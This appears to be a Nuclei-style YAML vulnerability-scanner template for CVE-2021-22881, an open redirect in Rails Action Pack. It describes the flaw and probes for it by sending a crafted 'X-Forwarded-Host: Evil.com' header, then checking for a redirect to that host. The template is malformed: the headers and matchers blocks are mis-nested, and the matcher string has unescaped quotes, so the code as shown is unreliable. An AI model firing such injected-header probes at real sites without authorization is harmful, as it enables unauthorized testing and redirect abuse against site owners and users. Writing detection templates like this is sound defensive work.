id: CVE-2021-22881

info:
  name: CVE-2021-22881 - Open Redirect
  author: Shelled
  severity: low
  description: The Host Authorization middleware in Action Pack before 6.1.2.1, 6.0.3.5 suffers from an open redirect vulnerability. Specially crafted `Host` headers in combination with certain "allowed host" formats can cause the Host Authorization middleware in Action Pack to redirect users to a malicious website. Impacted applications will have allowed hosts with a leading dot. When an allowed host contains a leading dot, a specially crafted `Host` header can be used to redirect to a malicious website.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2021-22881
    - https://hackerone.com/reports/1374512
  tags: redirect

requests:
  - method: GET
    path:
      - "{{BaseURL}}/"
    
headers:
  X-Forwarded-Host: Evil.com
  
matchers:
  - type: word
  words:
    - "You are being <a href="http://Evil.com/">redirected</a>"
  part: body
 
  - type: status
    status:
      - 200
      - 301
      - 302
      - 307
      - 308
    condition: or
